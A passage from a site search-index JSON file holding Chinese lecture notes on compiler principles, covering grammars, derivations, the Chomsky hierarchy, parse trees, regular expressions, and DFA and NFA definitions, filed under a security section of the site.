...\uff09\u3001\u8fd0\u7b97\u7b26\u3001\u6807\u70b9\u7b26\u53f7\u3001\u6570\u7ec4\u3001\u7c97\u4f53\u5b57\u7b26\u4e32\uff08id\u3001if \u7b49\uff09</p> <p>\u975e\u7ec8\u7ed3\u7b26\uff1a</p> <ul> <li>\u5b57\u6bcd\u8868\u4e2d\u6392\u5728\u524d\u9762\u7684\u5927\u5199\u5b57\u6bcd\uff08A, B, C\uff09</li> <li>\u5b57\u6bcd S \u8868\u793a\u5f00\u59cb\u7b26\u53f7</li> <li>\u5c0f\u5199\u3001\u659c\u4f53\u7684\u540d\u5b57\uff0c\u5982*expr*\u3001*stmt*\u7b49</li> <li>\u4ee3\u8868\u7a0b\u5e8f\u6784\u9020\u7684\u5927\u5199\u5b57\u6bcd\uff0c\u5982 E\uff08\u8868\u8fbe\u5f0f\uff09\u3001T\uff08\u9879\uff09\u548c F\uff08\u56e0\u5b50\uff09</li> </ul> <p>\u5b57\u6bcd\u8868\u4e2d\u6392\u5728\u540e\u9762\u7684\u5927\u5199\u5b57\u6bcd\uff08X, Y, Z\uff09\u8868\u793a \u6587\u6cd5\u7b26\u53f7\uff0c\u5373\u7ec8\u7ed3\u7b26\u6216\u975e\u7ec8\u7ed3\u7b26\uff0cV<sub>T</sub>\u222aV<sub>N</sub></p> <p>\u5b57\u6bcd\u8868\u4e2d\u6392\u5728\u540e\u9762\u7684\u5c0f\u5199\u5b57\u6bcd\uff08\u4e3b\u8981\u662f u, v, w, ...\uff09\u8868\u793a \u7ec8\u7ed3\u7b26\u53f7\u4e32\uff08\u5305\u62ec\u7a7a\u4e32\uff09</p> <p>\u5c0f\u5199\u5e0c\u814a\u5b57\u6bcd\uff0c\u5982 \u03b1\u3001\u03b2 \u8868\u793a \u6587\u6cd5\u7b26\u53f7\u4e32\uff08\u5305\u62ec\u7a7a\u4e32\uff09</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#2-3","title":"2-3 \u8bed\u8a00\u7684\u5b9a\u4e49","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#derivationsreductions","title":"\u63a8\u5bfc\uff08Derivations\uff09\u548c\u89c4\u7ea6\uff08Reductions\uff09","text":"<ul> <li>\u21d2\uff0c\u76f4\u63a5\u63a8\u5bfc</li> <li>\u21d2<sup>n</sup>\uff0c\u4f8b\u5982 \u03b1<sub>0</sub>\u21d2\u03b1<sub>1</sub>, \u03b1<sub>1</sub>\u21d2\u03b1<sub>2</sub>, \u03b1<sub>2</sub>\u21d2\u03b1<sub>3</sub>\uff0c\u5219\u8bb0\u4e3a, \u03b1<sub>0</sub>\u21d2<sup>3</sup>\u03b1<sub>3</sub></li> <li>\u21d2<sup>+</sup>\u8868\u793a\u201c\u7ecf\u8fc7\u6b63\u6570\u6b65\u63a8\u5bfc\u201d</li> <li>\u21d2<sup>*</sup>\u8868\u793a\u201c\u7ecf\u8fc7\u82e5\u5e72\uff08\u53ef\u4ee5\u662f 0\uff09\u6b65\u63a8\u5bfc\u201d</li> </ul> <p>\u6709\u4e86\u6587\u6cd5\uff08\u8bed\u8a00\u89c4\u5219\uff09\uff0c\u5982\u4f55\u5224\u5b9a\u67d0\u4e00\u8bcd\u4e32\u662f\u5426\u662f\u8be5\u8bed\u8a00\u7684\u53e5\u5b50\uff1f</p> <ul> <li>\u53e5\u5b50\u7684\u63a8\u5bfc\uff08\u6d3e\u751f\uff09- \u4ece\u751f\u6210\u8bed\u8a00\u7684\u89d2\u5ea6</li> <li>\u53e5\u5b50\u7684\u89c4\u7ea6 - \u4ece\u8bc6\u522b\u8bed\u8a00\u7684\u89d2\u5ea6</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_2","title":"\u53e5\u578b\u548c\u53e5\u5b50","text":"<ul> <li>\u5982\u679c S\u21d2<sup>*</sup>\u03b1\uff0c\u03b1\u2208(V<sub>T</sub>\u222aV<sub>N</sub>)<sup>*</sup>\uff0c\u5219\u79f0 \u03b1 \u662f G \u7684\u4e00\u4e2a\u53e5\u578b\u3002\u4e00\u4e2a\u53e5\u578b\u4e2d\u65e2\u53ef\u4ee5\u5305\u542b\u7ec8\u7ed3\u7b26\uff0c\u53c8\u53ef\u4ee5\u5305\u542b\u975e\u7ec8\u7ed3\u7b26\uff0c\u4e5f\u53ef\u80fd\u662f\u7a7a\u4e32\u3002</li> <li>\u5982\u679c S\u21d2<sup>*</sup>w\uff0cw\u2208V<sub>T</sub><sup>*</sup>\uff0c\u5219\u79f0 w \u662f G \u7684\u53e5\u5b50\u3002\u53e5\u5b50\u662f\u4e0d\u5305\u62ec\u975e\u7ec8\u7ed3\u7b26\u7684\u53e5\u578b\u3002</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_3","title":"\u8bed\u8a00","text":"<p>\u7531\u6587\u6cd5 G \u7684\u5f00\u59cb\u7b26\u53f7 S \u63a8\u5bfc\u51fa\u7684\u6240\u6709 \u53e5\u5b50\u6784\u6210\u7684\u96c6\u5408 \u79f0\u4e3a\u6587\u6cd5 G \u751f\u6210\u7684\u8bed\u8a00\uff0c\u8bb0\u4e3a L(G)\u3002</p> <p>\u5373\uff1aL(G)={w|S\u21d2*w, w\u2208V<sub>T</sub><sup>*</sup>}</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#2-4","title":"2-4 \u6587\u6cd5\u7684\u5206\u7c7b","text":"<p>\u4ea7\u751f\u5f0f\u96c6\u5408\uff1a\u03b1\u2192\u03b2</p> <ul> <li>0 \u578b\u6587\u6cd5\uff1a\u4ec5\u8981\u6c42 \u03b1 \u4e2d\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26</li> <li>1 \u578b\u6587\u6cd5\uff0c\u4e0a\u4e0b\u6587\u6709\u5173\u6587\u6cd5(CSG)\uff1a|\u03b1|\u2264|\u03b2|</li> <li>2 \u578b\u6587\u6cd5\uff0c\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5(CFG)\uff1a\u03b1\u2208V<sub>N</sub>\uff0c\u5373 \u03b1 \u53ea\u80fd\u662f\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff0c\u4e00\u822c\u5f62\u5f0f\u4e3a A\u2192\u03b2\u3002\u53ef\u4ee5\u63cf\u8ff0\u5927\u90e8\u5206\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u7684\u8bed\u6cd5\u6784\u9020\u3002</li> <li>3 \u578b\u6587\u6cd5\uff0c\u6b63\u5219\u6587\u6cd5(RG)\uff0c\u5206\u4e3a\u4e24\u7c7b\uff1a</li> <li>\u53f3\u7ebf\u6027\u6587\u6cd5\uff1aA\u2192wB \u6216 A\u2192w\uff0c\u8868\u8fbe\u5f0f\u7684\u53f3\u90e8\u53ea\u80fd\u662f\u7ec8\u7ed3\u7b26 w\uff0c\u8981\u4e48\u662f wB</li> <li>\u5de6\u7ebf\u578b\u6587\u6cd5\uff1aA\u2192Bw \u6216 A\u2192w</li> </ul> <p>\u56db\u79cd\u8bed\u6cd5\u4e4b\u95f4\u662f\u9010\u7ea7\u9650\u5236\u548c\u9010\u7ea7\u5305\u542b\u7684\u5173\u7cfb\u3002\u5373\uff0c\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u662f 3 \u578b\u6587\u6cd5\uff0c\u90a3\u4ed6\u4e00\u5b9a\u662f 2 \u578b\u6587\u6cd5\uff0c\u4e5f\u4e00\u5b9a\u662f 1 \u578b\u6587\u6cd5\uff0c\u4e5f\u4e00\u5b9a\u662f 0 \u578b\u6587\u6cd5\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#2-5-cfg","title":"2-5 \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\uff08CFG\uff09\u5206\u6790\u6811","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_4","title":"\u5206\u6790\u6811","text":"<ul> <li> <p>\u6839\u8282\u70b9\u7684\u6807\u53f7\u4e3a\u6587\u6cd5\u5f00\u59cb\u7b26\u53f7</p> </li> <li> <p>\u5185\u90e8\u7ed3\u70b9\u8868\u793a\u5bf9\u4e00\u4e2a\u4ea7\u751f\u5f0f A\u2192\u03b2 \u7684\u5e94\u7528\uff0c\u8be5\u7ed3\u70b9\u7684\u6807\u53f7\u662f\u6b64\u4ea7\u751f\u5f0f\u5de6\u90e8 A \u3002\u8be5\u7ed3\u70b9\u7684\u5b50\u7ed3\u70b9\u7684\u6807\u53f7\u4ece\u5de6\u5230\u53f3\u6784\u6210\u4e86\u4ea7\u751f\u5f0f\u7684\u53f3\u90e8 \u03b2</p> </li> <li> <p>\u53f6\u7ed3\u70b9\u7684\u6807\u53f7\u65e2\u53ef\u4ee5\u662f\u975e\u7ec8\u7ed3\u7b26\uff0c\u4e5f\u53ef\u4ee5\u662f\u7ec8\u7ed3\u7b26\u3002\u4ece\u5de6\u5230\u53f3\u6392\u5217\u53f6\u8282\u70b9 \u5f97\u5230\u7684\u7b26\u53f7\u4e32\u79f0\u4e3a\u662f\u8fd9\u68f5\u6811\u7684 \u4ea7\u51fa( yield )\u6216\u8fb9\u7f18(frontier)\u3002</p> </li> </ul> <p>\u5206\u6790\u6811\u672c\u8d28\u4e0a\u662f\u63a8\u5bfc\u7684\u56fe\u5f62\u5316\u663e\u793a\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u63a8\u5bfc \u03b1<sub>0</sub>\u21d2\u03b1<sub>1</sub>\u21d2\u03b1<sub>2</sub>\u21d2\u03b1<sub>3</sub> \uff0c\u5bf9\u4e8e\u63a8\u5bfc\u8fc7\u7a0b\u4e2d\u5f97\u5230\u7684\u6bcf\u4e00\u4e2a\u53e5\u578b \u03b1<sub>i</sub>\uff0c\u90fd\u53ef\u4ee5\u6784\u9020\u51fa\u4e00\u4e2a\u8fb9\u7f18\u4e3a \u03b1<sub>i</sub>\u7684\u5206\u6790\u6811\u3002</p> <p>\u63a8\u5bfc\u8fc7\u7a0b\uff1aE \u21d2 -E \u21d2 -(E) \u21d2 -(E+E) \uff0c\u5176\u8bed\u6cd5\u5206\u6790\u6811\u5982\u56fe\u6240\u793a\u3002</p> <p>\u53e5\u578b\u7684\u77ed\u8bed\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u53e5\u578b\uff0c\u5176\u5206\u6790\u6811\u4e2d\u7684\u6bcf\u4e00\u68f5\u5b50\u6811\u7684\u8fb9\u7f18\u79f0\u4e3a\u8be5\u53e5\u578b\u7684\u4e00\u4e2a\u77ed\u8bed\u3002\u5982\u679c\u5b50\u6811\u53ea\u6709\u7236\u5b50\u4e24\u4ee3\u7ed3\u70b9\uff0c\u5373\u5206\u6790\u6811\u7684\u9ad8\u5ea6\u4e3a 2\uff0c\u90a3\u4e48\u8fd9\u68f5\u5b50\u6811\u7684\u8fb9\u7f18\u79f0\u4e3a\u8be5\u53e5\u578b\u7684\u4e00\u4e2a \u76f4\u63a5\u77ed\u8bed\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_5","title":"\u4e8c\u4e49\u6027\u6587\u6cd5","text":"<p>\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u53ef\u4ee5\u4e3a\u67d0\u4e2a\u53e5\u5b50\u751f\u6210\u591a\u9897\u5206\u6790\u6811\uff0c\u5219\u79f0\u8fd9\u4e2a\u6587\u6cd5\u662f\u4e8c\u4e49\u6027\u7684\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_6","title":"\u7b2c\u4e09\u7ae0 \u8bcd\u6cd5\u5206\u6790","text":"<p>\u672c\u7ae0\u5171\u9610\u8ff0\u4e86\u4e09\u4e2a\u7b49\u4ef7\u7684\u6982\u5ff5\uff1a</p> <ul> <li>\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u6b63\u5219\u6587\u6cd5</li> <li>\u6709\u7a77\u81ea\u52a8\u673a\uff08FA\uff09</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_7","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Regular Expression, RE\uff09\u662f\u4e00\u79cd\u7528\u6765\u63cf\u8ff0 \u6b63\u5219\u8bed\u8a00 \u7684\u66f4\u7d27\u51d1\u7684\u8868\u793a\u65b9\u6cd5\uff0c\u5176\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u5b57\u7b26\u96c6 \u03a3={r1, r2, ..., rn}</li> <li>\u5f52\u7eb3\u5b9a\u4e49\uff1a</li> <li>\u7a7a\u4e32 \u03b5 \u662f\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u5bf9\u4e8e\u4efb\u610f r\u2208\u03a3\uff0cr \u662f\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u5982\u679c M \u548c N \u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5219\u4ee5\u4e0b\u4e5f\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a<ul> <li>\u9009\u62e9\uff1aM|N = {M, N}</li> <li>\u8fde\u63a5\uff1aMN = {mn | m\u2208M, n\u2208N}</li> <li>\u514b\u6797\u95ed\u5305\uff1aM* = {\u03b5, M, MM, MMM, ...}</li> </ul> </li> </ul> <p>\u6b63\u5219\u8bed\u8a00\uff1a\u6bcf\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f r \u8868\u793a\u4e00\u4e2a\u8bed\u8a00\uff0c\u53eb\u505a\u6b63\u5219\u8bed\u8a00\u6216\u6b63\u5219\u96c6\u5408\uff0c\u8bb0\u4e3a L\u00ae</p> <p>\u4ee4 \u03a3 = {a, b}\uff0c\u5219\uff1aL((a|b)(a|b)) = L(a|b) L(a|b)={a, b}{a, b}= { aa, ab, ba, bb }</p> <p>\u6b63\u5219\u5b9a\u4e49\uff1a\u5177\u6709\u5982\u4e0b\u5f62\u5f0f\u7684\u5b9a\u4e49\u5e8f\u5217 d<sub>i</sub>\u2192r<sub>i</sub></p> <ul> <li>\u6bcf\u4e2a d<sub>i</sub>\u90fd\u662f\u4e00\u4e2a\u65b0\u7b26\u53f7\uff0c\u5b83\u4eec\u90fd\u4e0d\u5728\u5b57\u6bcd\u8868 \u03a3 \u4e2d\uff0c\u800c\u4e14\u5404\u4e0d\u76f8\u540c\u3002</li> <li>\u6bcf\u4e2a r<sub>i</sub>\u662f\u5b57\u6bcd\u8868 \u03a3\u222a{d<sub>1</sub>, ... , d<sub>i-1</sub>}\u4e0a\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</li> </ul> <p>\u8bed\u6cd5\u7cd6\uff1a \u8bed\u6cd5\u7cd6\u7684\u6982\u5ff5\u4e3b\u8981\u7528\u4e8e\u7b80\u5316\u6784\u9020\u3002</p> <ul> <li>[r1-rn] == r1|r2|...|rn</li> <li>r+ == \u4e00\u4e2a\u6216\u591a\u4e2a r</li> <li>r\uff1f == \u96f6\u4e2a\u6216\u4e00\u4e2a r\u3002\u7b49\u4ef7\u4e8e \u03b5|r</li> <li>\"a*\" == \u8868\u793a a*\u81ea\u8eab\uff0c\u800c\u4e0d\u662f a \u7684\u514b\u6797\u95ed\u5305</li> <li>a{i,j} ==i \u5230 j \u4e2a e \u7684\u8fde\u63a5</li> <li>. == \u51fa'\\n'\u5916\u7684\u4efb\u610f\u5b57\u7b26</li> </ul> <p>\u8bed\u6cd5\u7cd6\u90fd\u4e0d\u662f\u5fc5\u987b\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528\u6700\u57fa\u672c\u7684\u5b9a\u4e49\u4e5f\u80fd\u5b9e\u73b0\u76f8\u540c\u7684\u529f\u80fd\uff0c\u4f46\u5e94\u7528\u8bed\u6cd5\u7cd6\u5b9e\u73b0\u8d77\u6765\u4f1a\u66f4\u7b80\u5355\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u6839\u636e\u6c47\u7f16\u8bed\u8a00\u7684\u77e5\u8bc6\uff0c\u53ef\u4ee5\u77e5\u9053\uff0c\u53ea\u9700\u8981\u4f7f\u7528\u4e24\u4e2a\u64cd\u4f5c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u56fe\u7075\u673a\u4e43\u81f3\u73b0\u4ee3\u8ba1\u7b97\u673a\u7684\u6240\u7528\u529f\u80fd\uff1a</p> <ul> <li>\u8d4b\u503c</li> <li>\u8df3\u8f6c</li> </ul> <p>\u90a3\u4e3a\u4ec0\u4e48\u9700\u8981\u4f7f\u7528 java\u3001c \u7b49\u9ad8\u7ea7\u8bed\u8a00\u6765\u5b9e\u73b0\u529f\u80fd\uff1f\u5c31\u662f\u4e3a\u4e86\u5b9e\u73b0\u8d77\u6765\u66f4\u7b80\u5355\uff01\u6700\u7ec8\u90fd\u5c06\u7ffb\u8bd1\u4e3a\u8d4b\u503c\u548c\u8df3\u8f6c\u4e24\u4e2a\u529f\u80fd\u3002</p> <p>\u56e0\u6b64 java \u548c c \u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3a\u8bed\u6cd5\u7cd6\uff0c\u672c\u8d28\u5c31\u662f\u4e00\u79cd\u5c01\u88c5\u3002</p> <p>\u4f8b\u5b50</p> <p>\u2460\u5982\u4f55\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u8868\u793a C \u8bed\u8a00\u4e2d\u7684\u5173\u952e\u5b57\uff1f\u4ee5 if \u4e3a\u4f8b\uff1a</p> <p>\u5df2\u77e5 C \u8bed\u8a00\u4e2d\u7684\u5b57\u6bcd\u8868 \u03a3 \u662f ASCII \u5b57\u7b26\u96c6\uff0c\u56e0\u6b64 i,f\u2208\u03a3\uff0c\u56e0\u6b64 i \u548c f \u90fd\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</p> <p>\u5bf9 i \u548c f \u8fdb\u884c\u8fde\u63a5\u8fd0\u7b97\uff0c\u6784\u6210\u4e86 if\uff0c\u56e0\u6b64 if \u4e5f\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</p> <p>\u2461\u5982\u4f55\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u8868\u793a C \u8bed\u8a00\u4e2d\u6807\u8bc6\u7b26\uff1f\u4f7f\u7528\u6b63\u5219\u5b9a\u4e49\u7684\u65b9\u5f0f\uff1a</p> <ul> <li>digit \u2192 0|1|2|\u2026|9</li> <li>letter* \u2192 A|B|\u2026|Z|a|b|\u2026|z|*</li> <li>id \u2192 letter*(letter*|digit)*</li> </ul> <p>\u5b9a\u4e49\u4e86\u4ee5\u82f1\u6587\u5b57\u6bcd\u6216\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\uff0c\u7531\u6570\u5b57\u3001\u5b57\u6bcd\u548c\u4e0b\u5212\u7ebf\u7ec4\u6210\u6807\u8bc6\u7b26\u540d\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_8","title":"\u6b63\u5219\u6587\u6cd5","text":"<p>\u6b63\u5219\u6587\u6cd5\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u7b49\u4ef7\uff1a</p> <ul> <li>\u5bf9\u4efb\u4f55\u6b63\u5219\u6587\u6cd5 G\uff0c\u5b58\u5728\u5b9a\u4e49\u540c\u4e00\u8bed\u8a00\u7684\u6b63\u5219\u8868\u8fbe\u5f0f r</li> <li>\u5bf9\u4efb\u4f55\u6b63\u5219\u8868\u8fbe\u5f0f r\uff0c\u5b58\u5728\u751f\u6210\u540c\u4e00\u8bed\u8a00\u7684\u6b63\u5219\u6587\u6cd5 G</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_9","title":"\u6709\u7a77\u81ea\u52a8\u673a","text":"<p>FA \u4f7f\u7528\u8f6c\u6362\u56fe\u8868\u793a\uff1a</p> <ul> <li>\u7ed3\u70b9\uff1aFA \u7684\u72b6\u6001</li> <li>\u521d\u59cb\u72b6\u6001\uff1a\u53ea\u6709\u4e00\u4e2a\uff0c\u7531 start \u7bad\u5934\u6307\u5411</li> <li>\u7ec8\u6b62\u72b6\u6001\uff1a\u53c8\u79f0\u63a5\u53d7\u72b6\u6001\uff0c\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u7528\u53cc\u5708\u8868\u793a</li> <li>\u5e26\u6807\u8bb0\u7684\u6709\u5411\u8fb9\uff1a\u5982\u679c\u5bf9\u4e8e\u8f93\u5165 a\uff0c\u5b58\u5728\u4e00\u4e2a\u4ece\u72b6\u6001 p \u5230\u72b6\u6001 q \u7684\u8f6c\u6362\uff0c\u5c31\u5728 p\u3001q \u4e4b\u95f4\u753b\u4e00\u6761\u6709\u5411\u8fb9\uff0c\u5e76\u6807\u8bb0\u4e0a a</li> </ul> <p></p> <p>\u7ed9\u5b9a\u8f93\u5165\u8f93\u5165\u4e32 x\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u5bf9\u5e94\u4e8e\u4e32 x \u7684\u4ece\u521d\u59cb\u72b6\u6001\u5230\u67d0\u4e2a\u7ec8\u6b62\u72b6\u6001\u7684\u8f6c\u6362\u5e8f\u5217\uff0c\u5219\u79f0\u4e32 x \u88ab\u8be5 FA \u63a5\u53d7\u3002</p> <p>\u7531\u4e00\u4e2a\u6709\u7a77\u81ea\u52a8\u673a M \u63a5\u53d7\u7684\u6240\u6709\u4e32\u6784\u6210\u7684\u96c6\u5408\u79f0\u4e3a\u662f\u8be5\u6709\u7a77\u81ea\u52a8\u673a\u5b9a\u4e49\u7684\u8bed\u8a00\uff0c\u8bb0\u4e3a L(M)\u3002</p> <p>\u5982\u56fe FA \u5b9a\u4e49\u7684\u8bed X \u8a00\u662f\u6240\u6709\u4ee5 abb \u7ed3\u5c3e\u7684\u5b57\u6bcd\u8868{a,b}\u4e0a\u7684\u4e32\u7684\u96c6\u5408\u3002</p> <ul> <li>L(M)\u4e2d\u7684 M \u4e3a FA \u5b9e\u4f8b\uff0c\u5176\u5982\u56fe\u6240\u793a</li> <li>L\u00ae\u4e2d\u7684 r \u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\uff1a(a|b)*abb</li> </ul> <p>FA \u5b58\u5728 \u6700\u957f\u5b57\u4e32\u5339\u914d\u539f\u5219\uff0c\u5373\u5728\u5230\u8fbe\u67d0\u4e2a\u7ec8\u6001\u4e4b\u540e\uff0c\u53ea\u8981\u8f93\u5165\u5e26\u4e0a\u8fd8\u6709\u7b26\u53f7\uff0cFA \u5c31\u7ee7\u7eed\u524d\u8fdb\uff0c\u4ee5\u4fbf\u5bfb\u627e\u5c3d\u53ef\u80fd\u957f\u7684\u5339\u914d\u3002</p> <p>FA \u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ul> <li>DFA\uff1a\u786e\u5b9a\u7684\u6709\u7a77\u81ea\u52a8\u673a</li> <li>NFA\uff1a\u4e0d\u786e\u5b9a\u7684\u6709\u7a77\u81ea\u52a8\u673a</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#dfa","title":"DFA","text":"<p>DFA \u7528\u4e94\u5143\u7ec4\u5b9a\u4e49\uff1aM = ( S\uff0c\u03a3 \uff0c\u03b4\uff0cs<sub>0</sub>\uff0cF )</p> <ul> <li>S\uff1a\u6709\u7a77\u72b6\u6001\u96c6</li> <li>\u03a3\uff1a\u8f93\u5165\u5b57\u6bcd\u8868\uff0c\u5373\u8f93\u5165\u7b26\u53f7\u96c6\u5408\u3002\u5047\u8bbe \u03b5 \u4e0d\u662f \u03a3 \u4e2d\u7684\u5143\u7d20</li> <li>\u03b4\uff1a\u5c06 S\u00d7\u03a3 \u6620\u5c04\u5230 S \u7684\u8f6c\u6362\u51fd\u6570\u3002\u2200s\u2208S, a\u2208\u03a3, \u03b4(s,a)\u8868\u793a\u4ece\u72b6\u6001 s \u51fa\u53d1\uff0c\u6cbf\u7740\u6807\u8bb0\u4e3a a \u7684\u8fb9\u6240\u80fd\u5230\u8fbe\u7684 \u72b6\u6001\u3002</li> <li>s<sub>0</sub>\uff1a\u5f00\u59cb\u72b6\u6001\uff0cs<sub>0</sub>\u2208 S</li> <li>F\uff1a\u63a5\u6536\u72b6\u6001\uff08\u6216\u7ec8\u6b62\u72b6\u6001\uff09\u96c6\u5408\uff0cF\u2286 S</li> </ul> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u4e00\u4e2a DFA\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u6bcf\u4e00\u4e2a\u8f93\u5165\u5230\u8fbe\u7684\u76ee\u7684\u5730\u7ed3\u70b9\u90fd\u662f\u786e\u5b9a\u7684\u3002</p> <ul> <li>S\uff1a\u6709\u7a77\u72b6\u6001\u96c6\uff0c{0, 1, 2, 3}</li> <li>\u03a3\uff1a\u8f93\u5165\u5b57\u6bcd\u8868\uff0c{a, b}</li> <li>\u03b4\uff1a{ (s<sub>0</sub>, b)\u2192s<sub>0</sub>,(s<sub>0</sub>, a)\u2192s<sub>1</sub>, ... }</li> <li>s<sub>0</sub>\uff1a\u5f00\u59cb\u72b6\u6001\uff0c0</li> <li>F\uff1a\u63a5\u6536\u72b6\u6001\u96c6\u5408\uff0c{3}</li> </ul> <p>\u6b64\u5916\uff0c\u53ef\u4ee5\u7528 \u8f6c\u6362\u8868 \u8868\u793a FA\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#nfa","title":"NFA","text":"<p>\u540c\u6837\u4f7f\u7528\u4e94\u5143\u7ec4 M = ( S\uff0c\u03a3 \uff0c\u03b4\uff0cs<sub>0</sub>\uff0cF )\u5b9a\u4e49\uff0c\u4ec5 \u03b4 \u4e0d\u540c\uff1a</p> <ul> <li>\u03b4\uff1a\u5c06 S\u00d7(\u03a3\u222a\u03b5)\u6620\u5c04\u5230 S \u7684\u5e42\u96c6\u7684\u8f6c\u6362\u51fd\u6570\u3002\u2200s\u2208S, a\u2208\u03a3, \u03b4(s,a)\u8868\u793a\u4ece\u72b6\u6001 s \u51fa\u53d1\uff0c\u6cbf\u7740\u6807\u8bb0\u4e3a a \u7684\u8fb9\u6240\u80fd\u5230\u8fbe\u7684 \u72b6\u6001\u96c6\u5408\u3002</li> </ul> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u4e00\u4e2a NFA\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u8f93\u5165\u7684\u76ee\u7684\u5730\u7ed3\u70b9\u4e0d\u662f\u786e\u5b9a\u7684\uff0c\u800c\u662f\u6709\u591a\u79cd\u53ef\u80fd\u7684\u7ed3\u70b9\u96c6\u5408\u3002</p> <p>\u6b64\u65f6 \u03b4={ (s<sub>0</sub>, a)\u2192{s<sub>0</sub>, s<sub>1</sub>}, 